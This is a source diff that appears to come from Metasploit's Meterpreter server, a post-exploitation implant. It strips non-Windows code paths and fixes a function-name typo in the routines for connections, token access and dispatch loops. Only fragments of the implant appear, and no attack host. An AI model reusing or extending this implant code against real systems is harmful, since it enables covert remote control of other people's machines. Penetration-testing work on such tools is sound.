@@ -19,8 +19,6 @@ int global_comm_timeout       = 0xaf79257f;
 /*! @brief Number of milliseconds to wait before connection retries. */
 const DWORD RETRY_TIMEOUT_MS = 1000;
 
-#ifdef _WIN32
-
 #include <windows.h> // for EXCEPTION_ACCESS_VIOLATION
 #include <excpt.h>
 
@@ -35,14 +33,6 @@ int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
 }
 
 #define InitAppInstance() { if( hAppInstance == NULL ) hAppInstance = GetModuleHandle( NULL ); }
-
-#else
-#define InitAppInstance()
-#define exceptionfilter(a, b)
-#define SetHandleInformation(a, b, c)
-#define ExitThread(x) exit((x))
-const unsigned int hAppInstance = 0x504b5320; // 'PKS '
-#endif
 
 #define PREPEND_ERROR "### Error: "
 #define PREPEND_INFO  "### Info : "
@@ -211,7 +201,7 @@ DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 	return ERROR_SUCCESS;
 }
 
-DWORD estbalish_tcp_connection(char* url, SOCKET* socketBuffer)
+DWORD establish_tcp_connection(char* url, SOCKET* socketBuffer)
 {
 	dprintf("[STAGELESS] Url: %s", url);
 	if (strncmp(url, "tcp", 3) == 0)
@@ -276,11 +266,7 @@ static VOID server_locking_callback(int mode, int type, const char * file, int l
  */
 static long unsigned int server_threadid_callback(VOID)
 {
-#ifdef _WIN32
 	return GetCurrentThreadId();
-#else
-	return pthread_self();
-#endif
 }
 
 /*!
@@ -396,17 +382,6 @@ static LONG server_socket_poll(Remote * remote, long timeout)
 	tv.tv_usec = timeout;
 
 	result = select((int)fd + 1, &fdread, NULL, NULL, &tv);
-
-#ifndef _WIN32
-	// Handle EAGAIN, etc.
-	if(result == -1)
-	{
-		if(errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)
-		{
-			result = 0;
-		}
-	}
-#endif
 
 	lock_release(remote->lock);
 
@@ -628,7 +603,6 @@ static DWORD server_dispatch(Remote * remote)
 	return result;
 }
 
-#ifdef _WIN32
 /*
  * The servers main dispatch loop for incoming requests using SSL over TCP
  */
@@ -789,14 +763,11 @@ static DWORD server_dispatch_http_wininet(Remote * remote)
 	return result;
 }
 
-#endif
-
 /*
  * Get the session id that this meterpreter server is running in.
  */
 DWORD server_sessionid()
 {
-#ifdef _WIN32
 	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );
 
 	static PROCESSIDTOSESSIONID pProcessIdToSessionId = NULL;
@@ -832,9 +803,6 @@ DWORD server_sessionid()
 	}
 
 	return dwSessionId;
-#else
-	return -1;
-#endif
 }
 
 VOID load_stageless_extensions(Remote* pRemote, ULONG_PTR fd)
@@ -870,10 +838,6 @@ DWORD server_setup(SOCKET fd)
 	BOOL bStageless = global_meterpreter_url[0] == 's';
 
 	dprintf("[SERVER] Initializing...");
-
-#ifdef _UNIX
-	int local_error = 0;
-#endif
 
 	// if hAppInstance is still == NULL it means that we havent been
 	// reflectivly loaded so we must patch in the hAppInstance value
@@ -912,7 +876,7 @@ DWORD server_setup(SOCKET fd)
 				dprintf("[SERVER] Using SSL transport on socket %ul...", fd);
 
 				dprintf("[SERVER] setting up stageless comms if required...");
-				res = estbalish_tcp_connection(pRemote->url, &pRemote->fd);
+				res = establish_tcp_connection(pRemote->url, &pRemote->fd);
 				if (res != ERROR_SUCCESS)
 				{
 					dprintf("[SERVER] Failed to get TCP communications running: %u (%x)", res, res);
@@ -938,7 +902,6 @@ DWORD server_setup(SOCKET fd)
 			// Store our thread handle
 			pRemote->hServerThread = serverThread->handle;
 
-#ifdef _WIN32
 			// Store our process token
 			if (!OpenThreadToken(pRemote->hServerThread, TOKEN_ALL_ACCESS, TRUE, &pRemote->hServerToken))
 			{
@@ -957,7 +920,6 @@ DWORD server_setup(SOCKET fd)
 			GetUserObjectInformation(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &cDesktopName, 256, NULL);
 			pRemote->cpOrigDesktopName = _strdup(cDesktopName);
 			pRemote->cpCurrentDesktopName = _strdup(cDesktopName);
-#endif
 
 			// Process our default SSL-over-TCP transport
 			if (pRemote->transport == METERPRETER_TRANSPORT_SSL)
@@ -1009,11 +971,7 @@ DWORD server_setup(SOCKET fd)
 				}
 
 				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", pRemote->transport);
-#ifdef _WIN32
 				server_dispatch_http_wininet(pRemote);
-#else
-				// XXX: Handle non-windows HTTP transport
-#endif
 
 				dprintf("[SERVER] Deregistering dispatch routines...");
 				deregister_dispatch_routines(pRemote);
